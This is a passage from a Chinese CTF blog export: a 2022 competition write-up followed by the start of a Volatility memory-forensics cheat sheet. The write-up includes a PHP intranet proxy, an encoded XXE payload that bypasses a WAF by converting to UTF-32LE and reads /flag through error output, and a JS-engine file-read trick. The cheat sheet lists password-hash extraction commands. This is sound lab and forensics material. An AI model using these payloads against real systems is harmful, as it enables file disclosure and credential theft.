'{\"state\":0, \"msg\":\"request_url is null\", \"content\":\"\"}';\n        }else{\n            if ($method == 'post' || $method == 'POST'){\n                $body = http_build_query($request_data);\n                $options = [\n                    'http' => [\n                        'method' => 'POST', // 注意要大写\n                        'header' => 'Content-type:application/x-www-form-urlencoded',\n                        'content' => $body,\n                        'ignore_errors'=> true, // 忽略报错，直接返回接口内容\n                    ],\n                ];\n                $context = stream_context_create($options);\n                $data = file_get_contents($request_url, false, $context);\n            }else if ($method == 'get'|| $method == 'GET'){\n                $curl = curl_init();\n                curl_setopt($curl, CURLOPT_URL, $request_url);\n                curl_setopt($curl, CURLOPT_HEADER, 0); // 不抓取头部信息。只返回数据\n                curl_setopt($curl, CURLOPT_TIMEOUT, (int)60000); // 超时设置\n                curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); // 1表示不返回bool值\n                $data = curl_exec($curl);\n                // $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); // 获取接口状态码\n                curl_close($curl);\n            }else{\n                $data = '{\"state\":0, \"msg\":\"method error. method is only in [get, post], options etc be not supported.\", \"content\":\"\"}';\n            }\n \n            $back = $data;\n        }\n \n        if ($to_json == true){\n            $res = json_encode($back, true);\n        }else{\n            $res = $back;\n        }\n \n        return $res;\n    }\n \n    // 获取完整网址\n    public function get_url(): string{\n        if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') {\n            $url = 'https://';\n        }else{\n            $url = 'http://';\n        }\n        //这里的逻辑会导致访问内网的URI与内网相同\n        //采用PATH_INFO的模式来表示内网需要的URI\n        //即 外 http://127.0.0.1/proxy.php/index => 内 http://127.0.0.1/index\n        // return $url.$_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT'].$_SERVER['REQUEST_URI'];\n        return $url.$_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT'].$_SERVER['PATH_INFO'];\n    }\n \n    // 是post\n    public function is_post(): bool{\n        return isset($_SERVER['REQUEST_METHOD']) && strtoupper($_SERVER['REQUEST_METHOD']) == 'POST';\n    }\n \n    // 是get\n    public function is_get(): bool{\n        return isset($_SERVER['REQUEST_METHOD']) && strtoupper($_SERVER['REQUEST_METHOD']) == 'GET';\n    }\n \n    // 生成内网网址：把外网网址解析到内网网址\n    public function make_request_url($host, $intranet): string{\n        return str_replace($host, $intranet, $this->get_url()); // 实际代理地址（就是替换主网址或路径）\n    }\n \n    // 转发接口\n    // 请从此处调用\n    public function request_intranet($host, $intranet): string{\n        // 测试的内网请求地址：$request_url = http://127.0.0.l:8000/api.gen1/admin\n        $request_url = $this->make_request_url($host, $intranet);\n        if ($this->is_post()){\n            $request_array = $_REQUEST; // 请求参数数组\n            $back = $this->request_option($request_url, 'post', $request_array, false);\n        }else if ($this->is_get()){\n            $request_array = [];\n            $back = $this->request_option($request_url, 'get', $request_array, false);\n        } else{\n            $back = '{\"state\":0, \"msg\":\"method error. method is only in [get, post], options etc be not supported.\", \"content\":\"\"}';\n        }\n        return $back;\n    }\n\n}\n\n\n// 返回数据\n$host = \"http://82.157.177.192:46728\"; // 外网网址（主网址或有部分路径）\n$intranet = 'http://127.0.0.1:8080'; // 内网网址（主网址或有部分路径）\n$php_proxy = new php_proxy();\n$back = $php_proxy->request_intranet($host, $intranet);\necho $back;\n?>\n```\n\n之后访问`http://IP:PORT/proxy.php/index`，就相当于访问`http://InnerIP:InnerPORT/index`\n\n![](/img/wp/2022/2022qgb-15.png)\n\n\n抓包一看，很明显的`XXE`\n\nfuzz一下，可恶，竟然还有waf\n\n![](/img/wp/2022/2022qgb-16.png)\n\n\n可以利用编码转换绕过waf\n`iconv -f utf8 -t UTF-32LE  1.xml > 2.xml`\n\n这里放一个编码后的payload（本地dtd读文件报错带flag）：\n`%3C%00%00%00%3F%00%00%00x%00%00%00m%00%00%00l%00%00%00+%00%00%00v%00%00%00e%00%00%00r%00%00%00s%00%00%00i%00%00%00o%00%00%00n%00%00%00%3D%00%00%00%22%00%00%001%00%00%00.%00%00%000%00%00%00%22%00%00%00+%00%00%00%3F%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00%21%00%00%00D%00%00%00O%00%00%00C%00%00%00T%00%00%00Y%00%00%00P%00%00%00E%00%00%00+%00%00%00m%00%00%00e%00%00%00s%00%00%00s%00%00%00a%00%00%00g%00%00%00e%00%00%00+%00%00%00%5B%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%25%00%00%00+%00%00%00l%00%00%00o%00%00%00c%00%00%00a%00%00%00l%00%00%00_%00%00%00d%00%00%00t%00%00%00d%00%00%00+%00%00%00S%00%00%00Y%00%00%00S%00%00%00T%00%00%00E%00%00%00M%00%00%00+%00%00%00%22%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3A%00%00%00%2F%00%00%00%2F%00%00%00%2F%00%00%00t%00%00%00m%00%00%00p%00%00%00%2F%00%00%001%00%00%00.%00%00%00d%00%00%00t%00%00%00d%00%00%00%22%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%25%00%00%00+%00%00%00c%00%00%00o%00%00%00n%00%00%00d%00%00%00i%00%00%00t%00%00%00i%00%00%00o%00%00%00n%00%00%00+%00%00%00%27%00%00%00a%00%00%00a%00%00%00a%00%00%00%29%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00+%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00+%00%00%00S%00%00%00Y%00%00%00S%00%00%00T%00%00%00E%00%00%00M%00%00%00+%00%00%00%22%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3A%00%00%00%2F%00%00%00%2F%00%00%00%2F%00%00%00f%00%00%00l%00%00%00a%00%00%00g%00%00%00%22%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00+%00%00%00e%00%00%00v%00%00%00a%00%00%00l%00%00%00+%00%00%00%22%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%006%00%00%00%3B%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00+%00%00%00e%00%00%00r%00%00%00r%00%00%00o%00%00%00r%00%00%00+%00%00%00S%00%00%00Y%00%00%00S%00%00%00T%00%00%00E%00%00%00M%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%007%00%00%00%3B%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3A%00%00%00%2F%00%00%00%2F%00%00%00%2F%00%00%00n%00%00%00o%00%00%00n%00%00%00e%00%00%00x%00%00%00i%00%00%00s%00%00%00t%00%00%00e%00%00%00n%00%00%00t%00%00%00%2F%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3B%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%007%00%00%00%3B%00%00%00%3E%00%00%00%22%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00e%00%00%00v%00%00%00a%00%00%00l%00%00%00%3B%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00e%00%00%00r%00%00%00r%00%00%00o%00%00%00r%00%00%00%3B%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00L%00%00%00E%00%00%00M%00%00%00E%00%00%00N%00%00%00T%00%00%00+%00%00%00a%00%00%00a%00%00%00+%00%00%00%28%00%00%00b%00%00%00b%00%00%00%27%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%25%00%00%00l%00%00%00o%00%00%00c%00%00%00a%00%00%00l%00%00%00_%00%00%00d%00%00%00t%00%00%00d%00%00%00%3B%00%00%00%0D%00%00%00%0A%00%00%00%5D%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00n%00%00%00a%00%00%00m%00%00%00e%00%00%00%3E%00%00%00f%00%00%00l%00%00%00a%00%00%00g%00%00%00%3C%00%00%00%2F%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00n%00%00%00a%00%00%00m%00%00%00e%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00p%00%00%00a%00%00%00s%00%00%00s%00%00%00w%00%00%00o%00%00%00r%00%00%00d%00%00%00%3E%00%00%00r%00%00%00o%00%00%00o%00%00%00t%00%00%00%3C%00%00%00%2F%00%00%00p%00%00%00a%00%00%00s%00%00%00s%00%00%00w%00%00%00o%00%00%00r%00%00%00d%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00%2F%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00%3E%00%00%00`\n\n\n\n![](/img/wp/2022/2022qgb-17.png)\n\n\n# misc #\n\n## Welcome_to_QGB ##\n`V2VsY29tZV90b19RR0I=`base64解码得到`Welcome_to_QGB`\n\n\n## 找找GIF ##\n伪加密，09->00，取出aaa\n\naaa添加后缀png，修改高度，得到压缩包密码：`okv90D%&ffgbd`\n\n解压得到bbb，添加gif头`GIF89a`，得到flag\n\n![](/img/wp/2022/2022qgb-18.png)\n\n\n## 大佬大佬 ##\n\nlsb提取出png\n\n![](/img/wp/2022/2022qgb-19.png)\n\n\n修改高度得到flag\n\n![](/img/wp/2022/2022qgb-20.png)\n\n\n## The fun picture ##\n\n爆破得到密码`gh89`\n\n![](/img/wp/2022/2022qgb-21.png)\n\n\nFUN添加后缀zip，解压后文件补上png头`89 50 4e 47`,得到二维码\n\n扫码得到`ZmxhZ3tycjkwZm5uZW1kZnUwOGdma2ttdmVtZGszZm12NmZnYX0=`\n\nbase64解码得到flag\n\n\n## B@tCh ##\n\n*赛后复现*\n\n`BatchEncryption`混淆的批处理文件\n\n特征一般是开头的两个字节为`0xFF`、`0xFE`，存在类似`BatchEncryption Build 201610 By gwsbhqt@163.com`的作者信息\n\n本题将作者信息去除了\n\n![](/img/wp/2022/2022qgb-22.png)\n\n\n解密脚本，来自[https://blog.csdn.net/Hunter98234/article/details/108672926](https://blog.csdn.net/Hunter98234/article/details/108672926)\n\n```python\n#!/usr/bin/python\n# -*- coding: utf-8 -*-\n#\n# Batch Decryption 202009 (BatchEncryption Build 201610)\n#\n\nimport os\n\n\ndef decryption(data):\n    if not (data[0] == 0xFF and data[1] == 0xFE):\n        print('Batch decryption bom error!')\n        return\n    if str(data[2:9], encoding=\"utf-8\") != ' &cls\\r\\n':\n        print('Batch decryption cls error!')\n        return\n    if str(data[9:60], encoding=\"utf-8\") != '::BatchEncryption Build 201610 By gwsbhqt@163.com\\r\\n':\n        print('Batch decryption build error!')\n        return\n\n    vars = {}\n\n    # decryption line\n    i = 60\n    l = len(data)\n    while i < l:\n        i = run(vars, data, i)\n\n\ndef run(vars, data, i):\n    buf = ''\n    f = 0\n    t = 0\n    x = False\n    l = len(data)\n    while(True):\n        if data[i] == 0x0d and data[i+1] == 0x0a:\n            i += 2\n            break\n        # get %var:~x,y% %0\n        if data[i] == 0x25:\n            if not x:\n                x = True\n                f = i\n            else:\n                x = False\n                t = i\n                rst = var_percent(data[f:t+1], vars)\n                buf += rst\n        else:\n            if not x:\n                buf += str(data[i:i+1], encoding=\"utf-8\")\n            else:\n                if (f + 1 == i) and ((data[i] >= 0x30 and data[i] <= 0x39) or data[i] == 0x2a):\n                    x = False\n                    t = i\n                    rst = str(data[f:t+1], encoding=\"utf-8\")\n                    buf += rst\n        i += 1\n        if i >= l:\n            break\n    #\n    print(buf)\n    bufs = buf.split('&@')\n    for var in bufs:\n        if var[0:4] == 'set ':\n            var = var[4:]\n            b = var.find('=')\n            vars[var[0:b]] = var[b+1:].replace('^^^', '^')\n\n    return i\n\n\ndef var_percent(data, vars):\n    full = str(data, encoding=\"utf-8\")\n    buf = full[1:len(full)-1]\n    buf = buf.split(':~')\n    var = buf[0]\n    if not var in vars:\n        vars[var] = os.getenv(var)\n    ent = vars[var]\n    if (len(buf) > 1):\n        l = len(ent)\n        buf = buf[1].split(',')\n        f = int(buf[0])\n        t = int(buf[1])\n        if f < 0:\n            f, t = l + f, t\n        rst = ent[f: f+t]\n    else:\n        rst = full\n    return rst\n\n\nencrypt_file = './batch_decryption/Encrypted_01.txt'\n\nif __name__ == '__main__':\n\n    try:\n        file = open(encrypt_file, \"rb\")\n        data = file.read()\n    except Exception as err:\n        print('Batch decryption read error:', err)\n        exit\n    else:\n        file.close()\n\n    decryption(data)\n```\n\n修改下脚本，使它能适用于本题\n\n因为附件中没有`Build 201610 By....`这串信息，所以将个判断去掉（17-19）\n没有这个字符串后，bat内容也会从相应的60变为9（从@开始）\n\n![](/img/wp/2022/2022qgb-23.png)\n\n95行改为文件名\n\n![](/img/wp/2022/2022qgb-24.png)\n\n\n运行解密得到flag\n\n![](/img/wp/2022/2022qgb-25.png)\n\n\n\n# pwn #\n\n## qqjs_new ##\n\n*非预期解*\n\nida分析，看到`import * as std from 'std'`和`import * as os from 'os'`\n\n![](/img/wp/2022/2022qgb-26.png)\n\n\n所以输入`os`会返回模块中的函数\n发现存在`readdir`，可以读目录\n\n![](/img/wp/2022/2022qgb-27.png)\n\n\n找到flag文件位置`/home/ctf/flag`\n\n![](/img/wp/2022/2022qgb-28.png)\n\n\n`std`模块中存在`loadFile`函数，可以读文件\n\n![](/img/wp/2022/2022qgb-29.png)\n\n\n读flag\n\n![](/img/wp/2022/2022qgb-30.png)\n\n\n# crypto #\n\n## babyRSA ##\n\n*赛后复现*\n\n```python\nimport gmpy2\nimport libnum\nimport os\nfrom Crypto.Util.number import *\nfrom gmpy2 import next_prime\nimport hashlib\n\n\n\np=165183720742741436051373219716388644270093189046466421563632727622389425827620783096218651072108769567350808642169644915755493944233905573858905774991122631609402471527613272585988802294622263573574301013199411535656758222265554222107815469076608655188293263358371274025455477828555535371028164366376886408977\nq=120848273460784230746197749214740170558670241437030497317956826606952430354830550737450520592481405802317202852411775956584677841602475259120706429378240071206662182089399302414435162197602907213282222144680788273948123482886712835590321726087823477518087588076504167863011019333002124841000448268076303735731\ne=33\nc=10407733127291995335613764691145477155502676597183852092212444772475748406250517097288411248334115120781386833588013995106957807313657632637086223225958539244315092039575434338289689184523710991223212333496000621300008178955253701172159259970353872359828291763446333588873982621853358272632447440961028670921631505593309092190417674648927653583956106734654954561031328286272044755552317084498103486458373580383410475085969677647030080606373264155592552338785789990114607084241499363324045488462563945268471178702696791804080490936763759252660049728533344304874474003893472238560682850602644793844258072019357796047919\n\n\nn = p*q\n\nd = gmpy2.invert(11, (p - 1) * (q - 1))\nc3 = pow(c, d, n)\nprint(c3)\ni = 0\nwhile True:\n    i += 1\n    m, flag = gmpy2.iroot(c3, 3)\n    print(i)\n    if flag:\n        print(hex(m))\n        exit()\n    c3 = c3 + n\n```","tags":["wp","2022竞赛","强国杯"],"categories":["wp"]},{"title":"misc总结(取证篇)","url":"/posts/92f52d5d/","content":"\n\n\n# Volatility2\n\nVolatility2是一款开源的，基于Python开发的内存取证工具集，可以分析内存中的各种数据。Volatility支持对32位或64位Windows、Linux、Mac、Android操作系统的RAM数据进行提取与分析。\n\n## 常用命令\n\n\n```text\n# 查看imagerinfo获取操作系统类型\nvolatility -f <filename> imageinfo\n\n# 指定操作系统类型进行其他操作\nvolatility -f <filename> --profile <ostype>\n\n# 查看进程\nvolatility -f <filename> --profile <ostype> pslist\n\n# 查看文件\nvolatility -f <filename> --profile <ostype> filescan | grep -E \"txt|xml|png|jpg|gif|zip|rar|7z|pdf|doc|docx|php|py|flag\"\n\n# 桌面\nvolatility -f <filename> --profile <ostype> filescan | grep -E \"Desktop\"\n\n# 导出文件\nvolatility -f <filename> --profile <ostype> dumpfiles -Q <virtual address> -D <savedir>\n\n# 获取系统用户名\nvolatility -f <filename> --profile <ostype> printkey -K \"SAM\\Domains\\Account\\Users\\Names\"\n\n# 查看注册表\nvolatility -f <filename> --profile <ostype> hivelist\n\n# 提取用户密码\nvolatility -f <filename> --profile <ostype> hashdump -y <注册表 system 的 virtual 地址> -s <SAM 的 virtual 地址>\n\n# 获取IE浏览器历史记录\nvolatility -f <filename> --profile <ostype> iehistory\n\n# 查看网络连接\nvolatility -f <filename> --profile <ostype> netscan\nvolatility -f <filename> --profile <ostype> connscan\n\n# 将内存中的某个进程数据以 dmp 的格式保存出来\nvolatility -f <filename> --profile <ostype> memdump -p <pid> -D <savedir>\n\n# 提取进程的可执行文件\nvolatility -f <filename> --profile <ostype> procdump -p <pid> -D <savedir>\n\n# 查看命令行历史记录\nvolatility -f <filename> --profile <ostype> cmdscan\nvolatility -f <filename> --profile <ostype> consoles\n\n# 查看进程命令行参数\nvolatility -f <filename> --profile <ostype> cmdline\n\n# 查看环境变量\nvolatility -f <filename> --profile <ostype> envars\n\n# 查看剪贴板信息\nvolatility -f <filename> --profile <ostype> clipboard\n```\n\n\n\n## 支持的插件列表\n\n\n```text\namcache             # 查看 AmCache 应用程序痕迹信息\napihooks            # 检测内核及进程的内存空间中的 API hook\natoms               # 列出会话及窗口站 atom 表\natomscan            # Atom 表的池扫描(Pool scanner)\nauditpol            # 列出注册表 HKLM\\SECURITY\\Policy\\PolAdtEv 的审计策略信息\nbigpools            # 使用 BigPagePoolScanner 转储大分页池(big page pools)\nbioskbd             # 从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出 BIOS 开机密码)\ncachedump           # 获取内存中缓存的域帐号的密码哈希\ncallbacks           # 打印全系统通知例程\nclipboard           # 提取 Windows 剪贴板中的内容\ncmdline             # 显示进程命令行参数\ncmdscan             # 提取执行的命令行历史记录（扫描_COMMAND_HISTORY 信息）\nconnections         # 打印系统打开的网络连接(仅支持 Windows XP 和 2003)\nconnscan            # 打印 TCP 连接信息\nconsoles            # 提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION 信息）\ncrashinfo           # 提取崩溃转储信息\ndeskscan            # tagDESKTOP 池扫描(Poolscaner)\ndevicetree          # 显示设备树信息\ndlldump             # 从进程地址空间转储动态链接库\ndlllist             # 打印每个进程加载的动态链接库列表\ndriverirp           # IRP hook 驱动检测\ndrivermodule        # 关联驱动对象至内核模块\ndriverscan          # 驱动对象池扫描\ndumpcerts           # 提取 RAS 私钥及 SSL 公钥\ndumpfiles           # 提取内存中映射或缓存的文件\ndumpregistry        # 转储内存中注册表信息至磁盘\neditbox             # 查看 Edit 编辑控件信息 (Listbox 正在实验中)\nenvars              # 显示进程的环境变量\neventhooks          # 打印 Windows 事件 hook 详细信息\nevtlogs             # 提取 Windows 事件日志(仅支持 XP/2003)\nfilescan            # 提取文件对象（file objects）池信息\ngahti               # 转储用户句柄（handle）类型信息\ngditimers           # 打印已安装的 GDI 计时器 (timers) 及回调(callbacks)\ngdt                 # 显示全局描述符表(Global Descriptor Table)\ngetservicesids      # 获取注册表中的服务名称并返回 SID 信息\ngetsids             # 打印每个进程的 SID 信息\nhandles             # 打印每个进程打开的句柄的列表\nhashdump            # 转储内存中的 Windows 帐户密码哈希(LM/NTLM)\nhibinfo             # 转储休眠文件信息\nhivedump            # 打印注册表配置单元信息\nhivelist            # 打印注册表配置单元列表\nhivescan            # 注册表配置单元池扫描\nhpakextract         # 从 HPAK 文件（Fast Dump 格式）提取物理内存数据\nhpakinfo            # 查看 HPAK 文件属性及相关信息\nidt                 # 显示中断描述符表(Interrupt Descriptor Table)\niehistory           # 重建 IE 缓存及访问历史记录\nimagecopy           # 将物理地址空间导出原生 DD 镜像文件\nimageinfo           # 查看 / 识别镜像信息\nimpscan             # 扫描对导入函数的调用\njoblinks            # 打印进程任务链接信息\nkdbgscan            # 搜索和转储潜在 KDBG 值\nkpcrscan            # 搜索和转储潜在 KPCR 值\nldrmodules          # 检测未链接的动态链接 DLL\nlsadump             # 从注册表中提取 LSA 密钥信息（已解密）\nmachoinfo           # 转储 Mach-O 文件格式信息\nmalfind             # 查找隐藏的和插入的代码\nmbrparser           # 扫描并解析潜在的主引导记录(MBR)\nmemdump             # 转储进程的可寻址内存\nmemmap              # 打印内存映射\nmessagehooks        # 桌面和窗口消息钩子的线程列表\nmftparser           # 扫描并解析潜在的 MFT 条目\nmoddump             # 转储内核驱动程序到可执行文件的示例\nmodscan             # 内核模块池扫描\nmodules             # 打印加载模块的列表\nmultiscan           # 批量扫描各种对象\nmutantscan          # 对互斥对象池扫描\nnotepad             # 查看记事本当前显示的文本\nobjtypescan         # 扫描窗口对象类型对象\npatcher             # 基于页面扫描的补丁程序内存\npoolpeek            # 可配置的池扫描器插件\nprintkey            # 打印注册表项及其子项和值\nprivs               # 显示进程权限\nprocdump            # 进程转储到一个可执行文件示例\npslist              # 按照 EPROCESS 列表打印所有正在运行的进程\npsscan              # 进程对象池扫描\npstree              # 以树型方式打印进程列表\npsxview             # 查找带有隐藏进程的所有进程列表\nqemuinfo            # 转储 Qemu 信息\nraw2dmp             # 将物理内存原生数据转换为 windbg 崩溃转储格式\nscreenshot          # 基于 GDI Windows 的虚拟屏幕截图保存\nservicediff         # Windows 服务列表(ala Plugx)\nsessions            # _MM_SESSION_SPACE 的详细信息列表(用户登录会话)\nshellbags           # 打印 Shellbags 信息\nshimcache           # 解析应用程序兼容性 Shim 缓存注册表项\nshutdowntime        # 从内存中的注册表信息获取机器关机时间\nsockets             # 打印已打开套接字列表\nsockscan            # TCP 套接字对象池扫描\nssdt                # 显示 SSDT 条目\nstrings             # 物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)\nsvcscan             # windows 服务列表扫描\nsymlinkscan         # 符号链接对象池扫描\nthrdscan            # 线程对象池扫描\nthreads             # 调查_ETHREAD 和_KTHREADs\ntimeliner           # 创建内存中的各种痕迹信息的时间线\ntimers              # 打印内核计时器及关联模块的 DPC\ntruecryptmaster     # 恢复 TrueCrypt 7.1a 主密钥\ntruecryptpassphrase # 查找并提取 TrueCrypt 密码\ntruecryptsummary    # TrueCrypt 摘要信息\nunloadedmodules     # 打印卸载的模块信息列表\nuserassist          # 打印注册表中 UserAssist 相关信息\nuserhandles         # 转储用户句柄表\nvaddump             # 转储 VAD 数据为文件\nvadinfo             # 转储 VAD 信息\nvadtree             # 以树形方式显示 VAD 树信息\nvadwalk             # 显示遍历 VAD 树\nvboxinfo            # 转储 Virtualbox 信息（虚拟机）\nverinfo             # 打印 PE 镜像中的版本信息\nvmwareinfo          # 转储 VMware VMSS/VMSN 信息\nvolshell            # 内存镜像中的 shell\nwindows             # 打印桌面窗口(详细信息)\nwintree             # Z 顺序打印桌面窗口树\nwndscan             # 池扫描窗口站\nyarascan            # 以 Yara 签名扫描进程或内核内存\n```\n\n\n## Linux 内存取证插件参数\n\n```text\n# 获取系统进程信息相关命令\nlinux_pstree        # 进程树列表\nlinux_pslist_cache  # 来自的 kmem_cache 活动进程\nlinux_psxview       # 比较进程列表\nlinux_lsof          # 打开文件描述符的每个活动进程\nlinux_pslist        # 活动的进程列表\nlinux_psaux         # 活动的进程列表（输出内容包括更多的细节）\n\n# 获取系统内存信息的相关命令\nlinux_memmap        # 内存映射文件\nlinux_pidhashtable  # Linux 内核中的 PID 散列表\nlinux_proc_maps     # 转储由-s/-vma 参数到磁盘上指定的内存范围。\nlinux_dump_map      # 进程内存的详细信息，包括堆和共享库。\nlinux_bash          # bash 历史文件\n\n# 获取网络接口信息的相关命令\nlinux_arp           # 显示 arp 列表\nlinux_ifconfig      # 显示网络接口详细情况\nlinux_route_cache   # 显示网络路由表\nlinux_netstat       # 查看网络链接情况\n\n# 获取系统硬件信息的相关命令\nlinux_cpuinfo       # 显示 cpu 的相关命令信息。\nlinux_dmesg         # 显示内核缓存信息。\nlinux_iomem         # 显示 io 设备信息。\nlinux_mount         # 显示/proc/mouns 的相关命令信息，主要是挂载的磁盘设备。\nlinux_mount_cache   # 显示 kmem_cache 的相关命令信息。\nlinux_slabinfo      # 显示/proc/slabinfo 的相关命令信息。\n\n# rootkit 检测的相关命令\nlinux_check_afinfo  # 检查篡改网络协议结构。\nlinux_check_creds   # 检查进程共享结构。\nlinux_check_fop     # 检查文件操作数据结构篡改情况。\nlinux_check_idt     # 检查中断描述符表（IDT）的篡改情况。\nlinux_check_syscall # 在系统调用表检查功能情况。\nlinux_check_modules # 检查用于从内核模块列表中缺少在 sysfs 中的项目。\n\n# 获取内核模块信息的相关命令\nlinux_lsmod         # 加载内核模块。\nlinux_tmpfs         # tmpfs 的内容。\n```\n\n\n## Profile\n\n>Volatility自带一些windows系统的profile，Linux系统的Profile需要自己制作，也可以使用第三方的profile文件：[https://github.com/KDPryor/LinuxVolProfiles](https://github.com/KDPryor/LinuxVolProfiles)\n\n>自己制作profile的方法如下：将`module.dwarf`和`system.map`打包成一个zip文件，移动到`volatility/volatility/plugins/overlays/linux`目录中\n\ncentos7制作profile：\n\n先安装`dwarfdump`（创建module.dwarf文件的依赖）\n\n```bash\nyum install -y gcc make gcc-c++ git zip elfutils-devel kernel-devel\nyum upgrade && reboot   //解决kernel-devel版本与系统版本不一致的问题\nwget https://www.prevanders.net/libdwarf-20201201.tar.gz --no-check-certificate\ntar -zxvf libdwarf-20201201.tar.gz\ncd libdwarf-20201201\n./configure\nmake\nmake install\ncd ../\n```\n\n在`volatility`目录中的`tool/Linux`运行`make`命令来创建`module.dwarf`文件\n\n```bash\ngit clone https://github.com/volatilityfoundation/volatility.git\ncd volatility/tools/linux\nmake\nls -l\n```\n\n打包，将`module.dwarf`和`system.map`打包成`centos7.zip`，移动到分析机的`volatility/volatility/plugins/overlays/linux`\n\n```bash\nzip centos7.zip /boot/System.map* module.dwarf\n```\n\n![](/img/summary/misc/quzheng-1.png)\n\n----------------------------------------\n\nubuntu制作profile：\n\n```bash\napt-get install -y dwarfdump build-essential\napt-get install -y linux-kernel-headers kernel-package\napt -y upgrade && reboot //解决kernel-devel版本与系统版本不一致的问题\n\ncd volatility/tools/linux\nmake -C /lib/modules/$(uname -r)/build CONFIG_DEBUG_INFO=y M=$PWD modules\ndwarfdump -di ./module.o > module.dwarf\nzip ubuntu_5.15.0-69.zip module.dwarf /boot/System.map-$(uname -r)\n```\n\n\n\n# Volatility3\n\n\nVolatility3是对Volatility2的重写，基于Python3编写，消除了对profile的依赖，使用符号表（配置文件）来匹配内存示例中的操作系统版本。\n\n\n## 符号表\n\n用于分析相关操作系统数据的内核符号表压缩包。注意：由于Linux内核易于编译且无法唯一区分它们，因此无法轻松提供详尽的Linux符号表集。官方下载地址：\n\n```bash\nwget downloads.volatilityfoundation.org/volatility3/symbols/windows.zip\nwget downloads.volatilityfoundation.org/volatility3/symbols/mac.zip\nwget downloads.volatilityfoundation.org/volatility3/symbols/linux.zip\n```\n\n解压后移动到`volatility3/volatility/symbols/`\n\n\n## 常用插件\n\n[linux命令手册](https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference)\n\n```text\nbanners.Banners                                 Attempts to identify potential linux banners in an image\nconfigwriter.ConfigWriter                       Runs the automagics and both prints and outputs configuration in the output directory.\nframeworkinfo.FrameworkInfo                     Plugin to list the various modular components of Volatility\nisfinfo.IsfInfo                                 Determines information about the currently available ISF files, or a specific one\nlayerwriter.LayerWriter                         Runs the automagics and writes out the primary layer produced by the stacker.\nlinux.bash.Bash                                 Recovers bash command history from memory.\nlinux.check_afinfo.Check_afinfo                 Verifies the operation function pointers of network protocols.\nlinux.check_creds.Check_creds                   Checks if any processes are sharing credential structures\nlinux.check_idt.Check_idt                       Checks if the IDT has been altered\nlinux.check_modules.Check_modules               Compares module list to sysfs info, if available\nlinux.check_syscall.Check_syscall               Check system call table for hooks.\nlinux.elfs.Elfs                                 Lists all memory mapped ELF files for all processes.\nlinux.keyboard_notifiers.Keyboard_notifiers     Parses the keyboard notifier call 